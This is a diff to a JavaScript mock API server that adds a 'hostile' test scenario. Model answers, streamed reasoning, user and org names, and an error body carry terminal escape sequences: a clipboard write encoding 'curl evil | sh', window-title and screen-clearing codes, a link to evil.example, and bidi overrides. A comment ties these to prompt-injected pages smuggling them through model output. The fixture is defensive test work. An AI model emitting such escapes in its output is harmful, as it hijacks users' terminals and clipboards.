@@ -16,6 +16,10 @@
 //   /stub/500/*          every endpoint answers 500 (gateway outage).
 //   /stub/two-orgs/*     /api/orgs lists two Orgs (First Org, Second Org).
 //   /stub/vision-catalog/* /v1/models serves one vision + one text-only model.
+//   /stub/hostile/*      chat completions carry HOSTILE_TEXT / HOSTILE_REASONING
+//                        (OSC 52, OSC 0); streamed, each escape is split across
+//                        SSE events. Identity, orgs and the logs error body
+//                        carry escapes, CR, newlines and bidi overrides too.
 //   (no prefix)          happy path: 200 identity + orgs.
 //
 // POST /v1/messages answers "mock:<label> model=<model>". --log <file> appends
@@ -79,6 +83,30 @@ const VISION_CATALOG = [
   catalogModel("vendor/vision-model", ["vision", "tool_calling"]),
   catalogModel("vendor/text-model", ["tool_calling"]),
 ];
+
+// A clipboard write and a window title, the way a prompt-injected page would
+// smuggle them through a model's answer and reasoning.
+const HOSTILE_TEXT = ["safe ", "\x1b]52;c;", "Y3VybCBldmlsIHwgc2g=", "\x1b", "\\", "after\n"];
+const HOSTILE_REASONING = ["\x1b]0", ";pwned", "\x07", "pondering"];
+
+const HOSTILE_USER = { id: "u1", email: "mallory@example.com\x1b]52;c;Y3VybA==\x07" };
+const HOSTILE_ORGS = [
+  { id: "org_1", name: "Evil\x1b]8;;https://evil.example\x1b\\Corp\x1b]8;;\x1b\\\nInjected row" },
+  { id: "org_2", name: "株式会社\u202Egnp.exe\x1b[2J\rテスト" },
+];
+const HOSTILE_ERROR = "bad request\x1b]0;pwned\x07\x1b[1A\x1b[2K\u202Eevil";
+
+function replyHostileStream(res, model) {
+  res.writeHead(200, { "Content-Type": "text/event-stream" });
+  const event = (delta) =>
+    res.write(`data: ${JSON.stringify({ model, choices: [{ index: 0, delta }] })}\n\n`);
+  for (const piece of HOSTILE_REASONING) event({ reasoning_content: piece });
+  for (const piece of HOSTILE_TEXT) event({ content: piece });
+  res.write(
+    `data: ${JSON.stringify({ model, choices: [{ index: 0, delta: {}, finish_reason: "stop" }], usage: { prompt_tokens: 1, completion_tokens: 1 } })}\n\n`,
+  );
+  res.end("data: [DONE]\n\n");
+}
 
 function reply(res, status, body, headers = {}) {
   res.writeHead(status, { "Content-Type": "application/json", ...headers });
@@ -260,6 +288,7 @@ function handle(req, res) {
       return reply401(res);
     }
     if (scenario === "two-orgs") return reply(res, 200, isUser ? HAPPY_USER : TWO_ORGS);
+    if (scenario === "hostile") return reply(res, 200, isUser ? HOSTILE_USER : HOSTILE_ORGS);
     return reply(res, 200, isUser ? HAPPY_USER : HAPPY_ORGS);
   }
 
@@ -282,6 +311,7 @@ function handle(req, res) {
 
   if (rest === "/logs") {
     if (scenario === "logs-404") return reply(res, 404, { error: "not_found" });
+    if (scenario === "hostile") return reply(res, 400, { error: { message: HOSTILE_ERROR } });
     return reply(res, 200, { data: [], has_more: false, next_after: null, next_after_id: null });
   }
 
@@ -301,11 +331,14 @@ function handle(req, res) {
     handleBody(req, (raw) => {
       if (res.writableEnded) return;
       let model = "";
+      let stream = false;
       try {
-        model = JSON.parse(raw).model ?? "";
+        ({ model = "", stream = false } = JSON.parse(raw));
       } catch {
         model = "";
       }
+      if (scenario === "hostile" && stream) return replyHostileStream(res, model);
+      const hostile = scenario === "hostile";
       reply(res, 200, {
         id: "chatcmpl-mock",
         object: "chat.completion",
@@ -313,7 +346,11 @@ function handle(req, res) {
         choices: [
           {
             index: 0,
-            message: { role: "assistant", content: `echo:${model}` },
+            message: {
+              role: "assistant",
+              content: hostile ? HOSTILE_TEXT.join("") : `echo:${model}`,
+              ...(hostile ? { reasoning_content: HOSTILE_REASONING.join("") } : {}),
+            },
             finish_reason: "stop",
           },
         ],
